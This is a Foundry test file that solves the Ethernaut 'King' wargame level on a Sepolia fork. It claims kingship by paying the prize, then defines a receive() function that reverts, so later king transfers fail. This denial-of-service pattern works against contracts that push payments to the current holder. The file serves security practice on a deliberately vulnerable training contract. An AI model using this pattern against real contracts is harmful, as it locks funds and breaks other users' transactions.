// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/09-King/King.sol";

contract ContractTest is Test {
    King level9 = King(payable(0x744efac1d83001908B44DbE90e9a99C10AB54bC2));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x744efac1d83001908B44DbE90e9a99C10AB54bC2),
            "Ethernaut09"
        );
    }

    function testEthernaut09() public {
        address(level9).call{value: level9.prize()}(""); // trigger the level9.receive() function
        assert(level9._king() == address(this));
        console.log(
            "--- King claimed! Now try again, tx should be reverted ---"
        );
        (bool success, ) = address(level9).call{value: level9.prize()}(""); // expect failed
    }

    receive() external payable {
        // block the future transfer
        revert("Not accepting");
    }
}
